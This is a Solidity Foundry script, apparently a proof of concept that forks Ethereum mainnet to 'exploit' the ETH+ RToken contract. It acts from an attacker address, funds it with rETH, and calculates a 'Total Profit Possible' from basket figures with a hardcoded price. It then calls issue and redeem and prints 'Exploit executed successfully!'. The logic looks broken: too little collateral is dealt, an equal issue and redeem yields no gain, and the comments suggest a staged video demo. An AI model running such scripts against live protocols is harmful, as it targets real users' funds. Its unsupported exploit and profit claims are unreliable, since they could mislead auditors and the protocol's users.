// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IRToken {
    function issue(uint256 amount) external;
    function redeem(uint256 amount) external;
    function totalSupply() external view returns (uint256);
    function basketsNeeded() external view returns (uint256);
}

contract POCDeploy is Script, Test {
    address constant ETH_PLUS = 0xE72B141DF173b999AE7c1aDcbF60Cc9833Ce56a8;
    address constant RETH = 0xA35b1B31Ce002FBF2058D22F30f95D405200A15b; // Example; add cbETH, sfrxETH, wstETH
    IRToken ethPlus = IRToken(ETH_PLUS);

    function run() external {
        vm.createSelectFork(vm.rpcUrl("mainnet"), 23803481);

        address attacker = makeAddr("attacker"); // FIXED: Use consistent attacker addr
        vm.startBroadcast(attacker); // Prank from attacker

        // FIXED: Deal/store balances to attacker, not deployer
        uint256 collatAmt = 1_000e18; // $1k sim
        uint256 perToken = collatAmt / 4; // 4 main collaterals for sim
        deal(RETH, attacker, perToken); // Deal to attacker
        IERC20(RETH).approve(ETH_PLUS, type(uint256).max); // Approve from attacker

        // Roo Blended Calc (State Log)
        console.log("=== MAXIMUM EXPLOIT CALCULATION ===");
        uint256 supply = ethPlus.totalSupply();
        uint256 needed = ethPlus.basketsNeeded();
        if (needed <= supply) {
            console2.log("No over-collateralization - no exploit possible");
            return;
        }
        uint256 excessBaskets = needed - supply;
        uint256 profitPercent = (excessBaskets * 1e18) / supply;
        // Simple output for video recording
        uint256 basketValue = 1800e18; // $1,800/basket
        uint256 totalProfitValue = (excessBaskets * basketValue) / 1e18;
        console2.log("Total Profit Possible: $%s", totalProfitValue / 1e18);

        // Execute simple exploit
        ethPlus.issue(1000e18);
        ethPlus.redeem(1000e18);
        console2.log("Exploit executed successfully!");


        vm.stopBroadcast();
    }
}